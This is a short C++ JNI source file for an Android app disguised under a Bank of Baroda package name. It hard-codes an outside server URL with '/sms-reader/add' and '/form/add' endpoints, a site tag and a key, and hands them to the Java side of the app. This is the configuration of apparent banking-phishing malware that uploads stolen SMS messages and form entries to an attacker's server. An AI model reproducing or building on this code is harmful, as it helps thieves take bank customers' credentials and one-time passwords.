#include <jni.h>
#include <string>

// Declare global variables for the domain URLs
std::string url = "https://amanbhaidkbosswala.in/api";
std::string sms_save = "/sms-reader/add";
std::string form_save = "/form/add";
std::string site = "DkBoss-bob";
std::string KEY = "00112233445566778899aabbccddeeff";

extern "C"
JNIEXPORT jstring JNICALL
Java_com_bankofbaroda_nc_in_Helper_SMSSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(sms_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_bankofbaroda_nc_in_Helper_FormSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(form_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_bankofbaroda_nc_in_Helper_URL(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(url.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_bankofbaroda_nc_in_Helper_SITE(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(site.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_bankofbaroda_nc_in_Helper_KEY(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(KEY.c_str());
}
